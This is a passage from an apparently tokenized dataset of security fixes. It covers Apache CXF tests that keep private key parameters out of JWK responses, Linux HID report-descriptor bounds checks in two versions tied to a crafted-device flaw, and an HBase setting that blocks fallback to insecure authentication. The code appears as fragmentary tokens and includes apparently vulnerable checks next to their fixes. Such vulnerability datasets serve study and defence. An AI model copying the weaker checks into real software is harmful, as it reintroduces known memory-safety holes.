"org", ".", "junit", ".", "Test", "public", "void", "testGetJWKRSAPublicKey", "(", ")", "throws", "Exception", "{", "URL", "busFile", "=", "OIDCFlowTest", ".", "class", ".", "getResource", "(", "\"", "client", ".", "xml", "\"", ");", "String", "address", "=", "\"", "https", ":", "//", "localhost", ":", "\"", "+", "JCACHE_SERVER", ".", "getPort", "(", ")", "+", "\"", "/", "services2", "/", "\";", "WebClient", "client", "=", "WebClient", ".", "create", "(", "address", ",", "OAuth2TestUtils", ".", "setupProviders", "(", "),", "\"", "alice", "\"", ",", "\"", "security", "\"", ",", "busFile", ".", "toString", "(", "))", ";", "client", ".", "accept", "(", "\"", "application", "/", "json", "\"", ");", "client", ".", "path", "(", "\"", "keys", "/", "\")", ";", "Response", "response", "=", "client", ".", "get", "(", ");", "JsonWebKeys", "jsonWebKeys", "=", "response", ".", "readEntity", "(", "JsonWebKeys", ".", "class", ")", ";", "assertEquals", "(", "1", ",", "jsonWebKeys", ".", "getKeys", "(", ").", "size", "(", "))", ";", "JsonWebKey", "jsonWebKey", "=", "jsonWebKeys", ".", "getKeys", "(", ").", "get", "(", "0", ")", ";", "assertEquals", "(", "KeyType", ".", "RSA", ",", "jsonWebKey", ".", "getKeyType", "(", "))", ";", "assertEquals", "(", "\"", "2011", "-", "04", "-", "29", "\"", ",", "jsonWebKey", ".", "getKeyId", "(", "))", ";", "assertNotNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "n", "\"", "))", ";", "assertNotNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "e", "\"", "))", ";", "/", "/", "Check", "we", "don", "'", "t", "send", "the", "private", "key", "back", "checkPrivateKeyParametersNotPresent", "(", "jsonWebKeys", ")", ";", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "testGetJWKECPublicKey", "(", ")", "throws", "Exception", "{", "URL", "busFile", "=", "OIDCFlowTest", ".", "class", ".", "getResource", "(", "\"", "client", ".", "xml", "\"", ");", "String", "address", "=", "\"", "https", ":", "//", "localhost", ":", "\"", "+", "JCACHE_SERVER", ".", "getPort", "(", ")", "+", "\"", "/", "services3", "/", "\";", "WebClient", "client", "=", "WebClient", ".", "create", "(", "address", ",", "OAuth2TestUtils", ".", "setupProviders", "(", "),", "\"", "alice", "\"", ",", "\"", "security", "\"", ",", "busFile", ".", "toString", "(", "))", ";", "client", ".", "accept", "(", "\"", "application", "/", "json", "\"", ");", "client", ".", "path", "(", "\"", "keys", "/", "\")", ";", "Response", "response", "=", "client", ".", "get", "(", ");", "JsonWebKeys", "jsonWebKeys", "=", "response", ".", "readEntity", "(", "JsonWebKeys", ".", "class", ")", ";", "assertEquals", "(", "1", ",", "jsonWebKeys", ".", "getKeys", "(", ").", "size", "(", "))", ";", "JsonWebKey", "jsonWebKey", "=", "jsonWebKeys", ".", "getKeys", "(", ").", "get", "(", "0", ")", ";", "assertEquals", "(", "KeyType", ".", "EC", ",", "jsonWebKey", ".", "getKeyType", "(", "))", ";", "assertEquals", "(", "\"", "ECKey", "\"", ",", "jsonWebKey", ".", "getKeyId", "(", "))", ";", "assertNotNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "x", "\"", "))", ";", "assertNotNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "y", "\"", "))", ";", "/", "/", "Check", "we", "don", "'", "t", "send", "the", "private", "key", "back", "checkPrivateKeyParametersNotPresent", "(", "jsonWebKeys", ")", ";", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "testGetJWKHMAC", "(", ")", "throws", "Exception", "{", "URL", "busFile", "=", "OIDCFlowTest", ".", "class", ".", "getResource", "(", "\"", "client", ".", "xml", "\"", ");", "String", "address", "=", "\"", "https", ":", "//", "localhost", ":", "\"", "+", "JCACHE_SERVER", ".", "getPort", "(", ")", "+", "\"", "/", "services4", "/", "\";", "WebClient", "client", "=", "WebClient", ".", "create", "(", "address", ",", "OAuth2TestUtils", ".", "setupProviders", "(", "),", "\"", "alice", "\"", ",", "\"", "security", "\"", ",", "busFile", ".", "toString", "(", "))", ";", "client", ".", "accept", "(", "\"", "application", "/", "json", "\"", ");", "client", ".", "path", "(", "\"", "keys", "/", "\")", ";", "Response", "response", "=", "client", ".", "get", "(", ");", "JsonWebKeys", "jsonWebKeys", "=", "response", ".", "readEntity", "(", "JsonWebKeys", ".", "class", ")", ";", "/", "/", "We", "don", "'", "t", "allow", "sending", "secret", "keys", "back", "from", "the", "key", "service", "by", "default", "assertNull", "(", "jsonWebKeys", ".", "getKeys", "(", "))", ";", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "testGetJWKHMACExplicitlyAllowed", "(", ")", "throws", "Exception", "{", "URL", "busFile", "=", "OIDCFlowTest", ".", "class", ".", "getResource", "(", "\"", "client", ".", "xml", "\"", ");", "String", "address", "=", "\"", "https", ":", "//", "localhost", ":", "\"", "+", "JCACHE_SERVER", ".", "getPort", "(", ")", "+", "\"", "/", "services5", "/", "\";", "WebClient", "client", "=", "WebClient", ".", "create", "(", "address", ",", "OAuth2TestUtils", ".", "setupProviders", "(", "),", "\"", "alice", "\"", ",", "\"", "security", "\"", ",", "busFile", ".", "toString", "(", "))", ";", "client", ".", "accept", "(", "\"", "application", "/", "json", "\"", ");", "client", ".", "path", "(", "\"", "keys", "/", "\")", ";", "Response", "response", "=", "client", ".", "get", "(", ");", "JsonWebKeys", "jsonWebKeys", "=", "response", ".", "readEntity", "(", "JsonWebKeys", ".", "class", ")", ";", "/", "/", "Here", "we", "explicitly", "allow", "sending", "back", "secret", "keys", "assertEquals", "(", "1", ",", "jsonWebKeys", ".", "getKeys", "(", ").", "size", "(", "))", ";", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "testGetJWKMultipleKeys", "(", ")", "throws", "Exception", "{", "URL", "busFile", "=", "OIDCFlowTest", ".", "class", ".", "getResource", "(", "\"", "client", ".", "xml", "\"", ");", "String", "address", "=", "\"", "https", ":", "//", "localhost", ":", "\"", "+", "JCACHE_SERVER", ".", "getPort", "(", ")", "+", "\"", "/", "services6", "/", "\";", "WebClient", "client", "=", "WebClient", ".", "create", "(", "address", ",", "OAuth2TestUtils", ".", "setupProviders", "(", "),", "\"", "alice", "\"", ",", "\"", "security", "\"", ",", "busFile", ".", "toString", "(", "))", ";", "client", ".", "accept", "(", "\"", "application", "/", "json", "\"", ");", "client", ".", "path", "(", "\"", "keys", "/", "\")", ";", "Response", "response", "=", "client", ".", "get", "(", ");", "JsonWebKeys", "jsonWebKeys", "=", "response", ".", "readEntity", "(", "JsonWebKeys", ".", "class", ")", ";", "assertEquals", "(", "2", ",", "jsonWebKeys", ".", "getKeys", "(", ").", "size", "(", "))", ";", "/", "/", "Check", "we", "don", "'", "t", "send", "the", "private", "key", "back", "checkPrivateKeyParametersNotPresent", "(", "jsonWebKeys", ")", ";", "}", "private", "void", "checkPrivateKeyParametersNotPresent", "(", "JsonWebKeys", "jsonWebKeys", ")", "{", "for", "(", "JsonWebKey", "jsonWebKey", ":", "jsonWebKeys", ".", "getKeys", "(", "))", "{", "assertNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "d", "\"", "))", ";", "assertNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "p", "\"", "))", ";", "assertNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "q", "\"", "))", ";", "assertNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "dp", "\"", "))", ";", "assertNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "dq", "\"", "))", ";", "assertNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "qi", "\"", "))", ";", "}", "}", "}", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?>", "<", "!-", "-", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "limitations", "under", "the", "License", ".", "-", "->", "<", "beans", "xmlns", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "beans", "\"", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xmlns", ":", "http", "=", "\"", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "transports", "/", "http", "/", "configuration", "\"", "xmlns", ":", "httpj", "=", "\"", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "transports", "/", "http", "-", "jetty", "/", "configuration", "\"", "xmlns", ":", "sec", "=", "\"", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "configuration", "/", "security", "\"", "xmlns", ":", "cxf", "=", "\"", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "core", "\"", "xmlns", ":", "jaxrs", "=", "\"", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "jaxrs", "\"", "xmlns", ":", "util", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "util", "\"", "xsi", ":", "schemaLocation", "=", "\"", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "jaxrs", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "schemas", "/", "jaxrs", ".", "xsd", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "core", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "schemas", "/", "core", ".", "xsd", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "beans", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "beans", "/", "spring", "-", "beans", ".", "xsd", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "util", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "util", "/", "spring", "-", "util", "-", "4", ".", "2", ".", "xsd", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "transports", "/", "http", "/", "configuration", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "schemas", "/", "configuration", "/", "http", "-", "conf", ".", "xsd", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "transports", "/", "http", "-", "jetty", "/", "configuration", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "schemas", "/", "configuration", "/", "http", "-", "jetty", ".", "xsd", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "configuration", "/", "security", "http", ":", "//", "cxf", ".", "apache", ".", "org", "/", "schemas", "/", "configuration", "/", "security", ".", "xsd", "\"", ">", "<", "bean", "class", "=", "\"", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "config", ".", "PropertyPlaceholderConfigurer", "\"", "/>", "<", "cxf", ":", "bus", ">", "<", "cxf", ":", "features", ">", "<", "cxf", ":", "logging", "/", ">", "<", "/", "cxf", ":", "features", ">", "<", "cxf", ":", "properties", ">", "<", "entry", "key", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "jaxrs", ".", "bus", ".", "providers", "\"", "value", "-", "ref", "=", "\"", "busProviders", "\"", "/>", "<", "/", "cxf", ":", "properties", ">", "<", "/", "cxf", ":", "bus", ">", "<", "!-", "-", "providers", "-", "->", "<", "util", ":", "list", "id", "=", "\"", "busProviders", "\"", ">", "<", "ref", "bean", "=", "\"", "oauthJson", "\"", "/>", "<", "/", "util", ":", "list", ">", "<", "bean", "id", "=", "\"", "oauthJson", "\"", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oauth2", ".", "provider", ".", "OAuthJSONProvider", "\"", "/>", "<", "httpj", ":", "engine", "-", "factory", "id", "=", "\"", "tls", "-", "config", "\"", ">", "<", "httpj", ":", "engine", "port", "=", "\"$", "{", "testutil", ".", "ports", ".", "oidc", "-", "keys", "-", "jcache", "}", "\">", "<", "httpj", ":", "tlsServerParameters", ">", "<", "sec", ":", "keyManagers", "keyPassword", "=", "\"", "password", "\"", ">", "<", "sec", ":", "keyStore", "type", "=", "\"", "JKS", "\"", "password", "=", "\"", "password", "\"", "resource", "=", "\"", "keys", "/", "Bethal", ".", "jks", "\"", "/>", "<", "/", "sec", ":", "keyManagers", ">", "<", "sec", ":", "trustManagers", ">", "<", "sec", ":", "keyStore", "type", "=", "\"", "JKS", "\"", "password", "=", "\"", "password", "\"", "resource", "=", "\"", "keys", "/", "Truststore", ".", "jks", "\"", "/>", "<", "/", "sec", ":", "trustManagers", ">", "<", "sec", ":", "clientAuthentication", "want", "=", "\"", "false", "\"", "required", "=", "\"", "false", "\"", "/>", "<", "/", "httpj", ":", "tlsServerParameters", ">", "<", "httpj", ":", "sessionSupport", ">", "true", "<", "/", "httpj", ":", "sessionSupport", ">", "<", "/", "httpj", ":", "engine", ">", "<", "/", "httpj", ":", "engine", "-", "factory", ">", "<", "bean", "id", "=", "\"", "oidcKeysService", "\"", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oidc", ".", "idp", ".", "OidcKeysService", "\"", "/>", "<", "jaxrs", ":", "server", "depends", "-", "on", "=", "\"", "tls", "-", "config", "\"", "address", "=", "\"", "https", ":", "//", "localhost", ":", "${", "testutil", ".", "ports", ".", "oidc", "-", "keys", "-", "jcache", "}", "/", "services", "\"", ">", "<", "jaxrs", ":", "serviceBeans", ">", "<", "ref", "bean", "=", "\"", "oidcKeysService", "\"", "/>", "<", "/", "jaxrs", ":", "serviceBeans", ">", "<", "jaxrs", ":", "providers", ">", "<", "bean", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jaxrs", ".", "JsonWebKeysProvider", "\"", "/>", "<", "/", "jaxrs", ":", "providers", ">", "<", "jaxrs", ":", "properties", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "type", "\"", "value", "=", "\"", "jks", "\"", "/", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "alias", "\"", "value", "=", "\"", "alice", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "password", "\"", "value", "=", "\"", "password", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "key", ".", "password", "\"", "value", "=", "\"", "password", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "file", "\"", "value", "=", "\"", "keys", "/", "alice", ".", "jks", "\"", "/", ">", "<", "/", "jaxrs", ":", "properties", ">", "<", "/", "jaxrs", ":", "server", ">", "<", "bean", "id", "=", "\"", "oidcKeysService2", "\"", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oidc", ".", "idp", ".", "OidcKeysService", "\"", "/>", "<", "jaxrs", ":", "server", "depends", "-", "on", "=", "\"", "tls", "-", "config", "\"", "address", "=", "\"", "https", ":", "//", "localhost", ":", "${", "testutil", ".", "ports", ".", "oidc", "-", "keys", "-", "jcache", "}", "/", "services2", "\"", ">", "<", "jaxrs", ":", "serviceBeans", ">", "<", "ref", "bean", "=", "\"", "oidcKeysService2", "\"", "/>", "<", "/", "jaxrs", ":", "serviceBeans", ">", "<", "jaxrs", ":", "providers", ">", "<", "bean", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jaxrs", ".", "JsonWebKeysProvider", "\"", "/>", "<", "/", "jaxrs", ":", "providers", ">", "<", "jaxrs", ":", "properties", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "type", "\"", "value", "=", "\"", "jwk", "\"", "/", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "alias", "\"", "value", "=", "\"", "2011", "-", "04", "-", "29", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "file", "\"", "value", "=", "\"", "org", "/", "apache", "/", "cxf", "/", "systest", "/", "jaxrs", "/", "security", "/", "certs", "/", "jwkPrivateSet", ".", "txt", "\"", "/", ">", "<", "/", "jaxrs", ":", "properties", ">", "<", "/", "jaxrs", ":", "server", ">", "<", "bean", "id", "=", "\"", "oidcKeysService3", "\"", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oidc", ".", "idp", ".", "OidcKeysService", "\"", "/>", "<", "jaxrs", ":", "server", "depends", "-", "on", "=", "\"", "tls", "-", "config", "\"", "address", "=", "\"", "https", ":", "//", "localhost", ":", "${", "testutil", ".", "ports", ".", "oidc", "-", "keys", "-", "jcache", "}", "/", "services3", "\"", ">", "<", "jaxrs", ":", "serviceBeans", ">", "<", "ref", "bean", "=", "\"", "oidcKeysService3", "\"", "/>", "<", "/", "jaxrs", ":", "serviceBeans", ">", "<", "jaxrs", ":", "providers", ">", "<", "bean", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jaxrs", ".", "JsonWebKeysProvider", "\"", "/>", "<", "/", "jaxrs", ":", "providers", ">", "<", "jaxrs", ":", "properties", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "type", "\"", "value", "=", "\"", "jwk", "\"", "/", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "alias", "\"", "value", "=", "\"", "ECKey", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "file", "\"", "value", "=", "\"", "org", "/", "apache", "/", "cxf", "/", "systest", "/", "jaxrs", "/", "security", "/", "certs", "/", "jwkPrivateSet", ".", "txt", "\"", "/", ">", "<", "/", "jaxrs", ":", "properties", ">", "<", "/", "jaxrs", ":", "server", ">", "<", "bean", "id", "=", "\"", "oidcKeysService4", "\"", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oidc", ".", "idp", ".", "OidcKeysService", "\"", "/>", "<", "jaxrs", ":", "server", "depends", "-", "on", "=", "\"", "tls", "-", "config", "\"", "address", "=", "\"", "https", ":", "//", "localhost", ":", "${", "testutil", ".", "ports", ".", "oidc", "-", "keys", "-", "jcache", "}", "/", "services4", "\"", ">", "<", "jaxrs", ":", "serviceBeans", ">", "<", "ref", "bean", "=", "\"", "oidcKeysService4", "\"", "/>", "<", "/", "jaxrs", ":", "serviceBeans", ">", "<", "jaxrs", ":", "providers", ">", "<", "bean", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jaxrs", ".", "JsonWebKeysProvider", "\"", "/>", "<", "/", "jaxrs", ":", "providers", ">", "<", "jaxrs", ":", "properties", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "type", "\"", "value", "=", "\"", "jwk", "\"", "/", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "alias", "\"", "value", "=", "\"", "HMAC512Key", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "file", "\"", "value", "=", "\"", "org", "/", "apache", "/", "cxf", "/", "systest", "/", "jaxrs", "/", "security", "/", "certs", "/", "jwkPrivateSet", ".", "txt", "\"", "/", ">", "<", "/", "jaxrs", ":", "properties", ">", "<", "/", "jaxrs", ":", "server", ">", "<", "bean", "id", "=", "\"", "oidcKeysService5", "\"", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oidc", ".", "idp", ".", "OidcKeysService", "\"", ">", "<", "property", "name", "=", "\"", "stripPrivateParameters", "\"", "value", "=", "\"", "false", "\"", "/>", "<", "/", "bean", ">", "<", "jaxrs", ":", "server", "depends", "-", "on", "=", "\"", "tls", "-", "config", "\"", "address", "=", "\"", "https", ":", "//", "localhost", ":", "${", "testutil", ".", "ports", ".", "oidc", "-", "keys", "-", "jcache", "}", "/", "services5", "\"", ">", "<", "jaxrs", ":", "serviceBeans", ">", "<", "ref", "bean", "=", "\"", "oidcKeysService5", "\"", "/>", "<", "/", "jaxrs", ":", "serviceBeans", ">", "<", "jaxrs", ":", "providers", ">", "<", "bean", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jaxrs", ".", "JsonWebKeysProvider", "\"", "/>", "<", "/", "jaxrs", ":", "providers", ">", "<", "jaxrs", ":", "properties", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "type", "\"", "value", "=", "\"", "jwk", "\"", "/", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "alias", "\"", "value", "=", "\"", "HMAC512Key", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "file", "\"", "value", "=", "\"", "org", "/", "apache", "/", "cxf", "/", "systest", "/", "jaxrs", "/", "security", "/", "certs", "/", "jwkPrivateSet", ".", "txt", "\"", "/", ">", "<", "/", "jaxrs", ":", "properties", ">", "<", "/", "jaxrs", ":", "server", ">", "<", "bean", "id", "=", "\"", "oidcKeysService6", "\"", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oidc", ".", "idp", ".", "OidcKeysService", "\"", "/>", "<", "jaxrs", ":", "server", "depends", "-", "on", "=", "\"", "tls", "-", "config", "\"", "address", "=", "\"", "https", ":", "//", "localhost", ":", "${", "testutil", ".", "ports", ".", "oidc", "-", "keys", "-", "jcache", "}", "/", "services6", "\"", ">", "<", "jaxrs", ":", "serviceBeans", ">", "<", "ref", "bean", "=", "\"", "oidcKeysService6", "\"", "/>", "<", "/", "jaxrs", ":", "serviceBeans", ">", "<", "jaxrs", ":", "providers", ">", "<", "bean", "class", "=", "\"", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jaxrs", ".", "JsonWebKeysProvider", "\"", "/>", "<", "/", "jaxrs", ":", "providers", ">", "<", "jaxrs", ":", "properties", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "type", "\"", "value", "=", "\"", "jwk", "\"", "/", ">", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "aliases", "\"", "value", "=", "\"", "2011", "-", "04", "-", "29", ",", "ECKey", "\"", "/>", "<", "entry", "key", "=", "\"", "rs", ".", "security", ".", "keystore", ".", "file", "\"", "value", "=", "\"", "org", "/", "apache", "/", "cxf", "/", "systest", "/", "jaxrs", "/", "security", "/", "certs", "/", "jwkPrivateSet", ".", "txt", "\"", "/", ">", "<", "/", "jaxrs", ":", "properties", ">", "<", "/", "jaxrs", ":", "server", ">", "<", "/", "beans", "></s>setInitKey", "(", "key", ")", ";", "}", "private", "void", "setInitKey", "(", "JsonWebKey", "key", ")", "{", "}", "boolean", "includeCert", "=", "boolean", "includeCertSha1", "=", "boolean", "includeCertSha256", "=", "boolean", "includePublicKey", "=", "JoseUtils", ".", "checkBooleanProperty", "(", "headers", ",", "props", ",", "m", ",", "}", "return", "JwkUtils", ".", "loadPublicJwkSet", "(", "m", ",", "props", ")", ";", "JsonWebKeys", "keySet", "=", "JwsUtils", ".", "loadPublicVerificationKeys", "(", "createMessage", "(", "),", "p", ")", ";", "JsonWebKeys", "keySet", "=", "JwsUtils", ".", "loadPublicVerificationKeys", "(", "createMessage", "(", "),", "p", ")", ";", "keySet", "=", "getFromLocalStore", "(", ");", "private", "static", "JsonWebKeys", "getFromLocalStore", "(", ")", "{", "return", "JwsUtils", ".", "loadPublicVerificationKeys", "(", "JAXRSUtils", ".", "getCurrentMessage", "(", "),", "props", ")", ";"], "docstring_tokens": ["figured", "the", "signature", "keystore", "file", "with", "private", "or", "secret", "key", "credentials"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "*", "rsize", ">", "=", "18", "&", "&", "rdesc", "[", "11", "]", "=", "=", "0x3c", "&", "&", "rdesc", "[", "12", "]", "=", "=", "0x02", ")", "{", "if", "(", "*", "rsize", ">", "=", "75", "&", "&", "if", "(", "(", "drv_data", "-", ">", "quirks", "&", "LG_RDESC", ")", "&", "&", "*", "rsize", ">", "=", "91", "&", "&", "rdesc", "[", "83", "]", "=", "=", "0x26", "&", "&", "if", "(", "(", "drv_data", "-", ">", "quirks", "&", "LG_RDESC_REL_ABS", ")", "&", "&", "*", "rsize", ">", "=", "51", "&", "&", "if", "(", "*", "rsize", ">", "=", "31", "&", "&", "rdesc", "[", "29", "]", "=", "=", "0x05", "&", "&", "rdesc", "[", "30", "]", "=", "=", "0x09", ")", "{", "if", "(", "*", "rsize", ">", "=", "62", "&", "&", "rdesc", "[", "39", "]", "=", "=", "0x2a", "&", "&", "rdesc", "[", "40", "]", "=", "=", "0xf5", "&", "&", "if", "(", "*", "rsize", ">", "=", "112", "&", "&", "rdesc", "[", "104", "]", "=", "=", "0x26", "&", "&", "rdesc", "[", "105", "]", "=", "=", "0x80", "&", "&</s>if", "(", "*", "rsize", ">", "=", "17", "&", "&", "rdesc", "[", "11", "]", "=", "=", "0x3c", "&", "&", "rdesc", "[", "12", "]", "=", "=", "0x02", ")", "{", "if", "(", "*", "rsize", ">", "=", "74", "&", "&", "if", "(", "(", "drv_data", "-", ">", "quirks", "&", "LG_RDESC", ")", "&", "&", "*", "rsize", ">", "=", "90", "&", "&", "rdesc", "[", "83", "]", "=", "=", "0x26", "&", "&", "if", "(", "(", "drv_data", "-", ">", "quirks", "&", "LG_RDESC_REL_ABS", ")", "&", "&", "*", "rsize", ">", "=", "50", "&", "&", "if", "(", "*", "rsize", ">", "=", "30", "&", "&", "rdesc", "[", "29", "]", "=", "=", "0x05", "&", "&", "rdesc", "[", "30", "]", "=", "=", "0x09", ")", "{", "if", "(", "*", "rsize", ">", "=", "60", "&", "&", "rdesc", "[", "39", "]", "=", "=", "0x2a", "&", "&", "rdesc", "[", "40", "]", "=", "=", "0xf5", "&", "&", "if", "(", "*", "rsize", ">", "=", "107", "&", "&", "rdesc", "[", "104", "]", "=", "=", "0x26", "&", "&", "rdesc", "[", "105", "]", "=", "=", "0x80", "&", "&"], "docstring_tokens": ["via", "a", "crafted", "device", "that", "provides", "a", "small", "report", "descriptor"]}
{"contents": ["empty"], "code_tokens": ["public", "static", "final", "String", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_KEY", "=", "\"", "hbase", ".", "ipc", ".", "client", ".", "fallback", "-", "to", "-", "simple", "-", "auth", "-", "allowed", "\"", ";", "public", "static", "final", "boolean", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_DEFAULT", "=", "false", ";", "saslRpcClient", "=", "new", "HBaseSaslRpcClient", "(", "authMethod", ",", "token", ",", "serverPrincipal", ",", "fallbackAllowed", ")", ";", "private", "final", "boolean", "fallbackAllowed", ";", "this", ".", "fallbackAllowed", "=", "conf", ".", "getBoolean", "(", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_KEY", ",", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_DEFAULT", ")", ";", "if", "(", "LOG", ".", "isDebugEnabled", "(", "))", "{", "LOG", ".", "debug", "(", "\"", "fallbackAllowed", "=", "\"", "+", "this", ".", "fallbackAllowed", ")", ";", "}", "private", "final", "boolean", "fallbackAllowed", ";", "Token", "<", "?", "extends", "TokenIdentifier", ">", "token", ",", "String", "serverPrincipal", ",", "boolean", "fallbackAllowed", ")", "throws", "IOException", "{", "this", ".", "fallbackAllowed", "=", "fallbackAllowed", ";", "if", "(", "!", "fallbackAllowed", ")", "{", "throw", "new", "IOException", "(", "\"", "Server", "asks", "us", "to", "fall", "back", "to", "SIMPLE", "auth", ",", "\"", "+", "\"", "but", "this", "client", "is", "configured", "to", "only", "allow", "secure", "\"", "+", "\"", "connections", ".", "\")", ";", "}", "if", "(", "LOG", ".", "isDebugEnabled", "(", "))", "{", "}", "<", "property", ">", "<", "name", ">", "hbase", ".", "ipc", ".", "client", ".", "fallback", "-", "to", "-", "simple", "-", "auth", "-", "allowed", "<", "/", "name", ">", "<", "value", ">", "false", "<", "/", "value", ">", "<", "description", ">", "When", "a", "client", "is", "configured", "to", "attempt", "a", "secure", "connection", ",", "but", "attempts", "to", "connect", "to", "an", "insecure", "server", ",", "that", "server", "may", "instruct", "the", "client", "to", "switch", "to", "SASL", "SIMPLE", "(", "unsecure", ")", "authentication", ".", "This", "setting", "controls", "whether", "or", "not", "the", "client", "will", "accept", "this", "instruction", "from", "the", "server", ".", "When", "false", "(", "the", "default", ")", ",", "the", "client", "will", "not", "allow", "the", "fallback", "to", "SIMPLE", "authentication", ",", "and", "will", "abort", "the", "connection", ".", "This", "setting", "is", "only", "used", "by", "the", "secure", "RPC", "engine", ".", "<", "/", "description", ">", "<", "/", "property", ">", "<", "property", ">", "<", "name", ">", "hbase", ".", "ipc", ".", "client", ".", "fallback", "-", "to", "-", "simple", "-", "auth", "-", "allowed", "<", "/", 